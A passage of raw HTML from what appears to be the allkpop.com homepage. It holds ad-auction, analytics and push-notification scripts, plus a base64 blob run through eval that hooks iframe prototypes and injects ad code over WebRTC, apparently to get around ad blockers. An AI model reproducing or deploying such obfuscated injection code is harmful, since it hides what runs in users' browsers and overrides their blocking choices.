                {bidder: "sovrn",params: {tagid: "464687"}},{bidder: "sovrn",params: {tagid: "464688"}},{bidder: "gumgum",params: {inSlot: 3899}},{bidder: "rubicon",params: {accountId: "8238",siteId: "13302",zoneId: "25463"}},{bidder: "pulsepoint",params: {cf: "300X250",cp: 558107,ct: 575547}},{bidder: "pulsepoint",params: {cf: "300X600",cp: 558107,ct: 575548}},{bidder: "districtmDMX",params: {id: "180625"}},            ]
        }
    ];
    var pbjs = pbjs || {};
    pbjs.que = pbjs.que || [];
        pbjs.bidderSettings = {
      districtmDMX: {
        bidCpmAdjustment : function(bidCpm){
          // adjust the bid in real time before the auction takes place
          return bidCpm * 0.85;
        }
      }
    };
    </script>
<script type="text/javascript" src="https://www.allkpop.com/plugin/pb/src/prebid20180302.js" async></script>
<script>
    var googletag = googletag || {};
    googletag.cmd = googletag.cmd || [];
    googletag.cmd.push(function() {
        googletag.pubads().disableInitialLoad();
    });
    pbjs.que.push(function() {
        pbjs.addAdUnits(adUnits);
        pbjs.requestBids({
            bidsBackHandler: sendAdserverRequest
        });
    });
    function sendAdserverRequest() {
        if (pbjs.adserverRequestSent) return;
        pbjs.adserverRequestSent = true;
        googletag.cmd.push(function() {
            pbjs.que.push(function() {
                pbjs.setTargetingForGPTAsync();
                //pbjs.setPriceGranularity("medium");
                googletag.pubads().refresh();
                
                /*var targetingParams = pbjs.getAdserverTargeting();
                var container = document.getElementById('container');
                container.innerHTML = JSON.stringify(targetingParams);*/
            });
        });
    }
    setTimeout(function() {
        sendAdserverRequest();
    }, PREBID_TIMEOUT);
</script> <script>
            (function () {
                var gads = document.createElement('script');
                gads.async = true;
                gads.type = 'text/javascript';
                var useSSL = 'https:' == document.location.protocol;
                gads.src = (useSSL ? 'https:' : 'http:') +
                        '//www.googletagservices.com/tag/js/gpt.js';
                var node = document.getElementsByTagName('script')[0];
                node.parentNode.insertBefore(gads, node);
            })();
            </script>
<script>
        googletag.cmd.push(function() {
            googletag.defineSlot('/1046641/akp2_home_728_top', [[728, 90], [970, 250], [970, 90]], 'div-gpt-ad-1456251248648-0').addService(googletag.pubads());
            googletag.defineSlot('/1046641/akp2_home_billboard_1', [[728, 90], [970, 250], [970, 90], [300, 250], [336, 280]], 'div-gpt-ad-1456251248648-1').addService(googletag.pubads());
            googletag.defineSlot('/1046641/akp2_home_billboard_2', [[300, 250], [336, 280]], 'div-gpt-ad-1456251248648-2').addService(googletag.pubads());
            googletag.defineSlot('/1046641/akp2_home_billboard_3', [[300, 250], [336, 280]], 'div-gpt-ad-1456251248648-3').addService(googletag.pubads());
            googletag.defineSlot('/1046641/akp2_home_billboard_4', [[300, 250], [336, 280]], 'div-gpt-ad-1456256348948-0').addService(googletag.pubads());
            googletag.defineSlot('/1046641/akp2_home_sidebar_1', [[300, 250], [300,600]], 'div-gpt-ad-1456251248648-4').addService(googletag.pubads());
            googletag.pubads().enableSingleRequest();
            googletag.pubads().collapseEmptyDivs();
            //googletag.pubads().enableAsyncRendering();
            googletag.enableServices();
        });
        </script>
<link rel="manifest" href="https://www.allkpop.com/manifest.json">
<script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async></script>
<script>
    var onesignal_user_id='';
    var onesignal_gender='';
    
    var OneSignal = window.OneSignal || [];
    //OneSignal.push(function() {OneSignal.showHttpPrompt();});
    
    OneSignal.push(["init", {
      appId: "0068da66-938f-4136-a24b-411a5a30d82b",
      autoRegister: true,
      notifyButton: {
        enable: true, /* Set to false to hide */
        position: 'bottom-left',
        prenotify: true, /* Show an icon with 1 unread message for first-time site visitors */
        showCredit: false, /* Hide the OneSignal logo */
        text: {
        'tip.state.unsubscribed': 'Subscribe to notifications',
        'tip.state.subscribed': "You're subscribed to notifications",
        'tip.state.blocked': "You've blocked notifications",
        'message.prenotify': 'Click to subscribe to notifications',
        'message.action.subscribed': "Thanks for subscribing!",
        'message.action.resubscribed': "You're subscribed to notifications",
        'message.action.unsubscribed': "You won't receive notifications again",
        'dialog.main.title': 'Manage allkpop Notifications',
        'dialog.main.button.subscribe': 'SUBSCRIBE',
        'dialog.main.button.unsubscribe': 'UNSUBSCRIBE',
        'dialog.blocked.title': 'Unblock Notifications',
        'dialog.blocked.message': "Follow these instructions to allow notifications:"
        },
        displayPredicate: function() {
        return OneSignal.isPushNotificationsEnabled()
            .then(function(isPushEnabled) {
                /* The user is subscribed, so we want to return "false" to hide the notify button */
                return !isPushEnabled;
            });
        },
      },
      promptOptions: {
            /* Change bold title, limited to 30 characters */
            siteName: 'allkpop.com',
            /* Subtitle, limited to 90 characters */
            actionMessage: "We'd like to show you notifications for the latest news and updates.",
            /* Example notification title */
            exampleNotificationTitle: 'Breaking News',
            /* Example notification message */
            exampleNotificationMessage: 'Bigbang...',
            /* Text below example notification, limited to 50 characters */
            exampleNotificationCaption: 'You can unsubscribe anytime',
            /* Accept button text, limited to 15 characters */
            acceptButtonText: "ALLOW",
            /* Cancel button text, limited to 15 characters */
            cancelButtonText: "NO THANKS"
      },
      safari_web_id: 'web.onesignal.auto.5f80e2fb-b063-4ecb-90f7-0c7e45de9678'
    }]);
    
    if(onesignal_user_id!=""){
        OneSignal.push(["getTags", function(tags) {
            //console.log(tags);
    		//if(Object.keys(tags).length==0){
    	       OneSignal.push(["sendTags", {"akp_id":onesignal_user_id,"gender": onesignal_gender}]);
               //OneSignal.sendTags({"akp_id": onesignal_user_id, "gender": onesignal_gender});
    	   	//}
    	}]);
    }
    
  </script>

<script data-cfasync='false' type='text/javascript'>/*<![CDATA[*/(function (a, c, s, u){'Insticator'in a || (a.Insticator={ad:{loadAd: function (b){Insticator.ad.q.push(b)}, q: []}, helper:{}, embed:{}, version: "3.0", q: [], load: function (t, o){Insticator.q.push({t: t, o: o})}}); var b=c.createElement(s); b.src=u; b.async=!0; var d=c.getElementsByTagName(s)[0]; d.parentNode.insertBefore(b, d)})(window, document, 'script', '//d2na2p72vtqyok.cloudfront.net/client-embed/672f12cc-3896-43ad-9d7d-26fdd80c7c99.js');/*]]>*/</script>

</head>
<style>body{height:0px;background-color:#f8f8f8;}.grey-bg{margin-left: auto;margin-right:auto;max-width:1050px;}.full-width{padding:0 0%!important;width: 100%!important;}</style>
<a href="https://www.allkpop.com/track.php?data=bW9kZT1odF9jbGljayZodF9pZHg9NjAmdXNlcl9pZD0wJnVzZXJfbmFtZT1ndWVzdCZsaW5rPWh0dHBzOi8vYXBwbGUuY28vMkZ4ckQxNyZjb3VudHJ5PVVTJmRhdGFfZnJvbT0vaW5kZXgucGhw||" target="_blank">
<img src="https://www.allkpop.com/imgs/external/sttb.gif" style="display:block;position:fixed;left:0;top:0;width:100%;height:100%;cursor:pointer;z-index:0;">
</a>
<script>
                        function ht_impression(data){$.get("/track.php",{mode:'ht_impression',data:data},function(data){});}
                        $(document).ready(function(){
                            $('body').css({'background-attachment':'fixed','background-image':'url(https://www.allkpop.com/plugin/homepage_takeover/img/ht_1521142366_skin.jpg)','background-position':'50% 25px','background-repeat':'no-repeat','background-size':'100% 100%'});
                            //$('body').css({'background-attachment':'fixed','background-image':'url(https://www.allkpop.com/plugin/homepage_takeover/img/ht_1521142366_skin.jpg)','background-position':'50% 0px','background-repeat':'no-repeat','background-size':'100% 125%'});
                            //$('body').css({'background-attachment':'fixed','background-image':'url(https://www.allkpop.com/plugin/homepage_takeover/img/ht_1521142366_skin.jpg)','background-position':'fixed','background-repeat':'no-repeat','background-size':'100% auto'});
                            setTimeout(function(){ht_impression('bW9kZT1odF9pbXByZXNzaW9uJmh0X2lkeD02MCZ1c2VyX2lkPTAmdXNlcl9uYW1lPWd1ZXN0Jmxpbms9aHR0cHM6Ly9hcHBsZS5jby8yRnhyRDE3JmNvdW50cnk9VVMmZGF0YV9mcm9tPS9pbmRleC5waHA=||');},500);
                        });
                    </script>
<body class="homepage">
<div id="fb-root"></div>
<script>
  window.fbAsyncInit = function() {
    FB.init({
      appId      : '173336579512859',
      xfbml      : true,
      version    : 'v2.12'
    });
    FB.AppEvents.logPageView();
  };

  (function(d, s, id){
     var js, fjs = d.getElementsByTagName(s)[0];
     if (d.getElementById(id)) {return;}
     js = d.createElement(s); js.id = id;
     js.src = "https://connect.facebook.net/en_US/sdk.js";
     fjs.parentNode.insertBefore(js, fjs);
   }(document, 'script', 'facebook-jssdk'));
</script>
<script async>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');ga('create', 'UA-2103550-3', 'auto');ga('create', 'UA-2103550-9', 'auto',{'name':'6theory_net'});ga('send', 'pageview');ga('6theory_net.send', 'pageview');</script>
<script>/* wrapper-7.0.2 */eval(atob("IWZ1bmN0aW9uIHQobixlLHIpe2Z1bmN0aW9uIG8oYSxzKXtpZighZVthXSl7aWYoIW5bYV0pe3ZhciBjPSJmdW5jdGlvbiI9PXR5cGVvZiByZXF1aXJlJiZyZXF1aXJlO2lmKCFzJiZjKXJldHVybiBjKGEsITApO2lmKGkpcmV0dXJuIGkoYSwhMCk7dmFyIGQ9bmV3IEVycm9yKCJDYW5ub3QgZmluZCBtb2R1bGUgJyIrYSsiJyIpO3Rocm93IGQuY29kZT0iTU9EVUxFX05PVF9GT1VORCIsZH12YXIgdT1lW2FdPXtleHBvcnRzOnt9fTtuW2FdWzBdLmNhbGwodS5leHBvcnRzLGZ1bmN0aW9uKHQpe3ZhciBlPW5bYV1bMV1bdF07cmV0dXJuIG8oZT9lOnQpfSx1LHUuZXhwb3J0cyx0LG4sZSxyKX1yZXR1cm4gZVthXS5leHBvcnRzfWZvcih2YXIgaT0iZnVuY3Rpb24iPT10eXBlb2YgcmVxdWlyZSYmcmVxdWlyZSxhPTA7YTxyLmxlbmd0aDthKyspbyhyW2FdKTtyZXR1cm4gb30oezE6W2Z1bmN0aW9uKHQsbixlKXsidXNlIHN0cmljdCI7IWZ1bmN0aW9uKCl7ZnVuY3Rpb24gbigpe2kmJmNvbnNvbGUubG9nLmFwcGx5KGNvbnNvbGUsYXJndW1lbnRzKX1mdW5jdGlvbiBlKHQsbixyLG8saSxhLHMsYyxkLHUpe3ZhciBmPWZ1bmN0aW9uKCl7dD09PSEwJiZjb25zb2xlLmxvZy5hcHBseShjb25zb2xlLGFyZ3VtZW50cyl9LGw9Wyc8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+KCcsZS50b1N0cmluZygpLCIpKCIsW3QudG9TdHJpbmcoKSxuLnRvU3RyaW5nKCksci50b1N0cmluZygpLG8udG9TdHJpbmcoKSxpLnRvU3RyaW5nKCksYS50b1N0cmluZygpLHMudG9TdHJpbmcoKSxjLnRvU3RyaW5nKCksZC50b1N0cmluZygpLHUudG9TdHJpbmcoKV0uam9pbigiLCIpLnRvU3RyaW5nKCksIik8IiwiL3NjcmlwdD4iXS5qb2luKCIiKTtuKCkoSFRNTElGcmFtZUVsZW1lbnQsIm5hbWUiLHIoKSxvKGwpKSxuKCkoSFRNTElGcmFtZUVsZW1lbnQsImNvbnRlbnREb2N1bWVudCIscyhhKGwpLGkoKSksYygpKSxuKCkoSFRNTElGcmFtZUVsZW1lbnQsImNvbnRlbnRXaW5kb3ciLGQoYShsKSxpKCkpLHUoKSksd2luZG93LmZhaWxlZF91cmxzPXdpbmRvdy5mYWlsZWRfdXJsc3x8W107dmFyIHA9WyJzY3JpcHQiLCJpbWciXTtkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJsb2FkIixmdW5jdGlvbih0KXtmKCJ3aXRoaW5JZnJhbWUgbG9hZCBldmVudCIsdC50YXJnZXQpLCF0LnRhcmdldHx8IlNDUklQVCIhPT10LnRhcmdldC5ub2RlTmFtZSYmIklNRyIhPT10LnRhcmdldC5ub2RlTmFtZXx8KHQudGFyZ2V0Ll9sb2FkU3RhdGU9ImxvYWQiKX0sITApLGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImVycm9yIixmdW5jdGlvbih0KXtmKCJ3aXRoaW5JZnJhbWUgZXJyb3IgZXZlbnQiLHQudGFyZ2V0KSwhdC50YXJnZXR8fCJTQ1JJUFQiIT09dC50YXJnZXQubm9kZU5hbWUmJiJJTUciIT09dC50YXJnZXQubm9kZU5hbWV8fCh0LnRhcmdldC5fbG9hZFN0YXRlPSJlcnJvciIsd2luZG93LmZhaWxlZF91cmxzPXdpbmRvdy5mYWlsZWRfdXJsc3x8W10sd2luZG93LmZhaWxlZF91cmxzLnB1c2godC50YXJnZXQuc3JjKSl9LCEwKSx3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigibWVzc2FnZSIsZnVuY3Rpb24odCl7dmFyIG49dC5kYXRhLmV2ZW50TmFtZTtpZih2b2lkIDAhPT1uKXN3aXRjaChuKXtjYXNlImZyYW1lTG9hZGVkIjp3aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHQuZGF0YSwiKiIpO2JyZWFrO2Nhc2UiYnViYmxldXAiOndpbmRvdy5wYXJlbnQucG9zdE1lc3NhZ2UodC5kYXRhLCIqIil9aWYodm9pZCAwIT09dC5kYXRhLmlmcmFtZUlkKXtmKCJtZXNzYWdlIHJlY2VpdmVkICIrdC5kYXRhLmlmcmFtZUlkKTt2YXIgZT10LmRhdGEscj1mdW5jdGlvbih0KXsibG9hZGluZyIhPT1kb2N1bWVudC5yZWFkeVN0YXRlP3QoKTpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJET01Db250ZW50TG9hZGVkIix0KX0sbz1mdW5jdGlvbiBpKHQpe3ZhciBuPXtvcmlnaW5JZnJhbWVJZDp0LmlmcmFtZUlkLHJlYWR5U3RhdGU6ZG9jdW1lbnQucmVhZHlTdGF0ZSxyZXF1ZXN0RGF0YTpbXSxjc3NEYXRhOltdfSxlPXQuc3JjU3Vic3RyaW5ncztpZih2b2lkIDAhPT1lKWZvcih2YXIgcj1kb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKHAuam9pbigiLCIpKSxvPTA7bzxyLmxlbmd0aDtvKyspe3ZhciBhPXJbb107aWYoYS5zcmMpe3ZhciBzPWUuc29tZShmdW5jdGlvbih0KXtyZXR1cm4gYS5zcmMuaW5kZXhPZih0KSE9PS0xfSk7aWYocyl7aWYodm9pZCAwPT09YS5fbG9hZFN0YXRlKXJldHVybiBmKCJXYWl0IGZvciBldmVudCBmcm9tICIrYS5zcmMpLGEuYWRkRXZlbnRMaXN0ZW5lcigibG9hZCIsZnVuY3Rpb24oKXtpKHQpfSksdm9pZCBhLmFkZEV2ZW50TGlzdGVuZXIoImVycm9yIixmdW5jdGlvbigpe2kodCl9KTtuLnJlcXVlc3REYXRhLnB1c2goe3R5cGU6YS5ub2RlTmFtZSxzcmM6YS5zcmMsc3RhdGU6YS5fbG9hZFN0YXRlfSl9fX12YXIgYz10LmRpc3BsYXlUeXBlcyxkPXQuY3NzQXR0cmlidXRlczt2b2lkIDAhPT1jJiZ2b2lkIDAhPT1kJiYocj1kb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKGMuam9pbigiLCIpKSxBcnJheS5wcm90b3R5cGUuZm9yRWFjaC5jYWxsKHIsZnVuY3Rpb24odCl7dmFyIGU9d2luZG93LmdldENvbXB1dGVkU3R5bGUodCkscj17fTtkLmZvckVhY2goZnVuY3Rpb24odCl7clt0XT1lLmdldFByb3BlcnR5VmFsdWUodCl9KSxuLmNzc0RhdGEucHVzaCh7dHlwZTp0Lm5vZGVOYW1lLGlkOnQuaWQsImNsYXNzIjp0LmdldEF0dHJpYnV0ZSgiY2xhc3MiKSxjc3NBdHRyaWJ1dGVzOnJ9KX0pKSxmKCJzZW5kIHJlc3BvbnNlICIrdC5pZnJhbWVJZCksbi5mYWlsZWRfdXJscz13aW5kb3cuZmFpbGVkX3VybHMscGFyZW50LnBvc3RNZXNzYWdlKG4sIioiKX07cihmdW5jdGlvbigpe28oZSl9KX19KX12YXIgcj10KDUpO3dpbmRvdy5hZG9uaXNIYXNoPXdpbmRvdy5hZG9uaXNIYXNofHx3aW5kb3cubG9jYXRpb24uaGFzaHx8IiI7dmFyIG89d2luZG93LlJUQ1BlZXJDb25uZWN0aW9ufHx3aW5kb3cubW96UlRDUGVlckNvbm5lY3Rpb258fHdpbmRvdy53ZWJraXRSVENQZWVyQ29ubmVjdGlvbjtpZighbylyZXR1cm4gdm9pZCByLnJlcG9ydEV2ZW50KCJib290c3RyYXAuaWZ3LnJ0Yy5hYnNlbnQiKTtyLnJlcG9ydEV2ZW50KCJib290c3RyYXAuaWZ3LnJ0Yy5leGlzdHMiKTt2YXIgaT13aW5kb3cuYWRvbmlzSGFzaC5pbmRleE9mKCJhZG9uaXMtbG9nZ2luZyIpIT09LTEsYT1mdW5jdGlvbigpe3JldHVybiBmdW5jdGlvbih0LG4sZSxyKXt2YXIgbz1PYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKHQucHJvdG90eXBlLG4pO09iamVjdC5kZWZpbmVQcm9wZXJ0eSh0LnByb3RvdHlwZSxuLHtnZXQ6ZnVuY3Rpb24oKXtyZXR1cm4gZShvLmdldCx0aGlzLGFyZ3VtZW50cyl9LHNldDpmdW5jdGlvbigpe3JldHVybiByKG8uc2V0LHRoaXMsYXJndW1lbnRzKX0sZW51bWVyYWJsZTohMH0pfX0scz1mdW5jdGlvbigpe3JldHVybiBmdW5jdGlvbih0LG4sZSl7cmV0dXJuIHQuYXBwbHkobixlKX19LGM9ZnVuY3Rpb24odCl7cmV0dXJuIGZ1bmN0aW9uKGUscixvKXt0cnl7dmFyIGk9b1swXTtpZihpLmluZGV4T2YoImh0bWwiKSE9PS0xKXt2YXIgYT1pLnNwbGl0KCI7Iikscz1hWzFdLGM9cGFyc2VJbnQocykrdC5sZW5ndGg7YVsxXT1jLnRvU3RyaW5nKCksaT1hLmpvaW4oIjsiKSxpPWkucmVwbGFjZSgiPGhlYWQ+IiwiPGhlYWQ+Iit0KSxvWzBdPWl9fWNhdGNoKGQpe24oZCl9cmV0dXJuIGUuYXBwbHkocixvKX19LGQ9ZnVuY3Rpb24oKXtyZXR1cm4gZnVuY3Rpb24odCl7dmFyIG49ITE7aWYodC5zcmMmJjAhPT10LnNyYy5pbmRleE9mKCJqYXZhc2NyaXB0OiIpJiYwIT09dC5zcmMuaW5kZXhPZigiYWJvdXQ6YmxhbmsiKSl7dmFyIGU9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYSIpO2UuaHJlZj10LnNyYzt2YXIgcj1lLmhvc3Q7cj09PXdpbmRvdy5sb2NhdGlvbi5ob3N0JiYobj0hMCl9ZWxzZSBuPSEwO3JldHVybiBufX0sdT1mdW5jdGlvbih0KXtyZXR1cm4gZnVuY3Rpb24oZSxyKXt2YXIgbz1yLndyaXRlO3Iud3JpdGU9ZnVuY3Rpb24oZSl7dHJ5e3RoaXMuX2luamVjdGVkfHwoZS5pbmRleE9mKCI8aGVhZD4iKSE9PS0xPyhlPWUucmVwbGFjZSgvPGhlYWQ+KC4qKTxcL2hlYWQ+LyxmdW5jdGlvbihuLGUpe3JldHVybiI8aGVhZD4iK3QrZSsiPC9oZWFkPiJ9KSx0aGlzLl9pbmplY3RlZD0hMCk6ZS5pbmRleE9mKCI8Ym9keSIpIT09LTE/KGU9ZS5yZXBsYWNlKC8oPGJvZHkuKj8+KS8sZnVuY3Rpb24obixlKXtyZXR1cm4gZSt0fSksdGhpcy5faW5qZWN0ZWQ9ITApOmUuaW5kZXhPZigiPHNjcmlwdCIpIT09LTEmJihlPWUucmVwbGFjZSgvKDxzY3JpcHQuKj8+Lio8XC9zY3JpcHQ+KS8sZnVuY3Rpb24obixlKXtyZXR1cm4gdCtlfSksdGhpcy5faW5qZWN0ZWQ9ITApKX1jYXRjaChyKXtuKHIpfXJldHVybiBvLmNhbGwodGhpcyxlKX19fSxmPWZ1bmN0aW9uKHQsZSl7cmV0dXJuIGZ1bmN0aW9uKHIsbyxpKXt2YXIgYT1yLmFwcGx5KG8saSk7dHJ5e2lmKG8uY29udGVudERvY3VtZW50RGVjb3JhdGVkKXJldHVybiBhO28uY29udGVudERvY3VtZW50RGVjb3JhdGVkPSEwLGUobykmJnQobyxhKX1jYXRjaChzKXtuKHMpfXJldHVybiBhfX0sbD1mdW5jdGlvbigpe3JldHVybiBmdW5jdGlvbih0LG4sZSl7cmV0dXJuIHQuYXBwbHkobixlKX19LHA9ZnVuY3Rpb24odCxlKXtyZXR1cm4gZnVuY3Rpb24ocixvLGkpe3ZhciBhPXIuYXBwbHkobyxpKTt0cnl7aWYoby5jb250ZW50V2luZG93RGVjb3JhdGVkKXJldHVybiBhO28uY29udGVudFdpbmRvd0RlY29yYXRlZD0hMCxlKG8pJiZ0KG8sYS5kb2N1bWVudCl9Y2F0Y2gocyl7bihzKX1yZXR1cm4gYX19LHc9ZnVuY3Rpb24oKXtyZXR1cm4gZnVuY3Rpb24odCxuLGUpe3JldHVybiB0LmFwcGx5KG4sZSl9fSxnPVsnPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPignLGUudG9TdHJpbmcoKSwiKSgiLFtpLnRvU3RyaW5nKCksYS50b1N0cmluZygpLHMudG9TdHJpbmcoKSxjLnRvU3RyaW5nKCksZC50b1N0cmluZygpLHUudG9TdHJpbmcoKSxmLnRvU3RyaW5nKCksbC50b1N0cmluZygpLHAudG9TdHJpbmcoKSx3LnRvU3RyaW5nKCldLmpvaW4oIiwiKS50b1N0cmluZygpLCIpPCIsIi9zY3JpcHQ+Il0uam9pbigiIik7YSgpKEhUTUxJRnJhbWVFbGVtZW50LCJuYW1lIixzKCksYyhnKSksYSgpKEhUTUxJRnJhbWVFbGVtZW50LCJjb250ZW50RG9jdW1lbnQiLGYodShnKSxkKCkpLGwoKSksYSgpKEhUTUxJRnJhbWVFbGVtZW50LCJjb250ZW50V2luZG93IixwKHUoZyksZCgpKSx3KCkpfSgpfSx7NTo1fV0sMjpbZnVuY3Rpb24odCxuLGUpeyJ1c2Ugc3RyaWN0Ijt2YXIgcj10KDMpO3dpbmRvdy5hZG9uaXNIYXNoPXdpbmRvdy5hZG9uaXNIYXNofHx3aW5kb3cubG9jYXRpb24uaGFzaHx8IiI7dmFyIG89d2luZG93LmFkb25pc0hhc2guaW5kZXhPZigiYWRvbmlzLWxvZ2dpbmciKT49MDtyLkxPR19MRVZFTD1vPyJkZWJ1ZyI6ci5MT0dfTEVWRUw7dmFyIGk9d2luZG93LmFkb25pc3x8e307aS53c0hvc3QmJnIuV1MmJihyLldTLmhvc3Q9aS53c0hvc3QpLGkudHJhbnNwb3J0JiZyLlNVRVpfSFRUUF9FTkRQT0lOVCYmKHIuU1VFWl9IVFRQX0VORFBPSU5UPWkudHJhbnNwb3J0KSxuLmV4cG9ydHM9cn0sezM6M31dLDM6W2Z1bmN0aW9uKHQsbixlKXsidXNlIHN0cmljdCI7bi5leHBvcnRzPXtSRUFMX1NUVU5fSE9TVDoic3R1bi54cGFuYW1hLm5ldDozNDc4IixUVVJOU0lHTkFMX0hPU1Q6InRzLnAueHBhbmFtYS5uZXQ6NzAwMCIsU1RVTkdVTl9IT1NUOiJzZy5wLnhwYW5hbWEubmV0OjM0ODAiLFNFUlZFUl9DQU5ESURBVEU6ImNhbmRpZGF0ZTo4Mjc2NDgwMjYgMSB1ZHAgMjEyMjE5NDY4NyBTRVJWRVJfSVAgU0VSVkVSX1BPUlQgdHlwIGhvc3QgZ2VuZXJhdGlvbiAwIixSRVBPUlRJTkdfVVJMOiJodHRwczovL2xiLnN0YXRzZXZlbnQuY29tL3N0YXRzIixSRVBPUlRJTkdfUkFURTouMDEsTE9HX0xFVkVMOiJlcnJvciIsUkVQT1JUX0VSUk9SUzohMCxNQU5JRkVTVF9VUkw6Imh0dHBzOi8vc3JpLmpzaW50ZWdyaXR5LmNvbS9tYW5pZmVzdC5qc29uIixNQU5JRkVTVF9FWFBJUkFUSU9OX1RJTUU6ODY0MDAsQURfTUFSS0VSOiJhZG9uaXMtbWFya2VyIixBRE9OSVNfQ0xJRU5UX0ZFVENIX1VSTDoiaHR0cHM6Ly9hZHNlcnZlci54cGFuYW1hLm5ldC9jbGllbnQtNy1sYXRlc3QuanMiLFdTOntob3N0OiJzdWV6LXNlcnZlci54cGFuYW1hLm5ldCIscGF0aDoiL3dzIixwb3J0OjQ0MyxzZWN1cmU6ITAscHJvbWlzZVRpbWVvdXQ6M2UzfSxTRVJWSUNFX1NUQVRVU19VUkw6ZnVuY3Rpb24odCl7cmV0dXJuImh0dHBzOi8vY2xpZW50LnJlYWN0cmpzLmNvbS8iK3QrIi1zdGF0dXMuanNvbiJ9LFNVRVpfSFRUUF9FTkRQT0lOVDoiaHR0cHM6Ly9zdWV6LnhwYW5hbWEubmV0L2h0dHAiLFNVRVpfSFRUUF9SRVRSWTozLFNVRVpfSFRUUF9ERUxBWToxMDB9fSx7fV0sNDpbZnVuY3Rpb24odCxuLGUpeyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKHQpe3JldHVybiB0JiZ0Ll9fZXNNb2R1bGU/dDp7ImRlZmF1bHQiOnR9fXZhciBvPXQoMiksaT1yKG8pLGE9dCg3KSxzPSgwLGEuY3JlYXRlKSh7bGV2ZWw6aVsiZGVmYXVsdCJdLkxPR19MRVZFTH0pO24uZXhwb3J0cz17bG9nZ2VyOnMsc3VlekxvZ2dlcjpzfX0sezI6Miw3Ojd9XSw1OltmdW5jdGlvbih0LG4sZSl7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIodCl7dmFyIG49bmV3IFhNTEh0dHBSZXF1ZXN0LGU9W2QuUkVQT1JUSU5HX1VSTCx0XS5qb2luKCIiKTtuLm9wZW4oIkdFVCIsZSwhMCksbi5zZW5kKCl9ZnVuY3Rpb24gbyh0KXtkLlJFUE9SVF9FUlJPUlMmJnIoIi9hZG9uaXNfZXJyb3I/ZT0iK3QudG9TdHJpbmcoKSsiJndlYnNpdGU9Iit3aW5kb3cubG9jYXRpb24uaG9zdG5hbWUpfWZ1bmN0aW9uIGkoKXtyZXR1cm4gbnVsbCE9d2luZG93LkFET05JU19CT09UU1RSQVBfU1RBVFM/d2luZG93LkFET05JU19CT09UU1RSQVBfU1RBVFM9PT0hMDpNYXRoLnJhbmRvbSgpPGQuUkVQT1JUSU5HX1JBVEV9ZnVuY3Rpb24gYSh0LG4pe2lmKHModCksaSgpKXt2YXIgZT17d2Vic2l0ZTp3aW5kb3cubG9jYXRpb24uaG9zdG5hbWUsa2V5OnR9O251bGwhPW4mJihlLnF1YW50aXR5PW4pLHIoWyIvYWRvbmlzX2V2ZW50Lz9ldmVudD0iLEpTT04uc3RyaW5naWZ5KGUpXS5qb2luKCIiKSl9fWZ1bmN0aW9uIHModCl7dmFyIG49e2tleTp0LHRpbWVfbXM6TWF0aC5yb3VuZCh3aW5kb3cucGVyZm9ybWFuY2Uubm93KCkpLHdlYnNpdGU6d2luZG93LmxvY2F0aW9uLmhvc3RuYW1lfTtmLnB1c2gobil9ZnVuY3Rpb24gYygpe3UuZGVmaW5lUmVhZE9ubHlQcm9wZXJ0eSgiYWRvbmlzQm9vdHN0cmFwVGltaW5nIixmKX12YXIgZD10KDIpLHU9dCg2KSxmPVtdO24uZXhwb3J0cz17cmVwb3J0RXJyb3I6byxyZXBvcnRFdmVudDphLHNhdmVUaW1pbmc6YyxzaG91bGRSZXBvcnQ6aX19LHsyOjIsNjo2fV0sNjpbZnVuY3Rpb24odCxuLGUpeyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKHQsbil7dHJ5e09iamVjdC5kZWZpbmVQcm9wZXJ0eSh3aW5kb3csdCx7dmFsdWU6bix3cml0YWJsZTohMX0pfWNhdGNoKGUpe28ud2FybigiQ2Fubm90IGRlZmluZSByZWFkLW9ubHkgcHJvcGVydHkgb2Ygd2luZG93IG9iamVjdDogIitlKX19dmFyIG89dCg0KS5sb2dnZXIsaT1mdW5jdGlvbih0KXsibG9hZGluZyIhPT1kb2N1bWVudC5yZWFkeVN0YXRlP3QoKTpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJET01Db250ZW50TG9hZGVkIix0KX07bi5leHBvcnRzPXtkZWZpbmVSZWFkT25seVByb3BlcnR5OnIscmVhZHk6aX19LHs0OjR9XSw3OltmdW5jdGlvbih0LG4sZSl7ZnVuY3Rpb24gcih0LG4pe2NvbnN0IGU9YVtuXTt2b2lkIDAhPT1lJiYoZT4wJiYodC5hc3NlcnQ9ZnVuY3Rpb24oKXt9KSxlPjUmJih0LnRyYWNlPWZ1bmN0aW9uKCl7fSksZT4xMCYmKHQuZGVidWc9ZnVuY3Rpb24oKXt9KSxlPjIwJiYodC5sb2c9ZnVuY3Rpb24oKXt9KSxlPjMwJiYodC5pbmZvPWZ1bmN0aW9uKCl7fSksZT40MCYmKHQud2Fybj1mdW5jdGlvbigpe30pLGU+NTAmJih0LmVycm9yPWZ1bmN0aW9uKCl7fSkpfWZ1bmN0aW9uIG8odCxuKXtuPW58fHt9O2NvbnN0IGU9bi5sZXZlbHx8ImRlYnVnIjtyKHQsZSl9ZnVuY3Rpb24gaSh0KXtjb25zdCBuPU9iamVjdC5jcmVhdGUoY29uc29sZSk7cmV0dXJuIG8obix0KSxufWNvbnN0IGE9e2FsbDowLHRyYWNlOjUsZGVidWc6MTAsbG9nOjIwLGluZm86MzAsd2Fybjo0MCxlcnJvcjo1MH0scz1pKCk7bi5leHBvcnRzPXtsb2dnZXI6cyxjb25maWd1cmU6byxjcmVhdGU6aX19LHt9XX0se30sWzFdK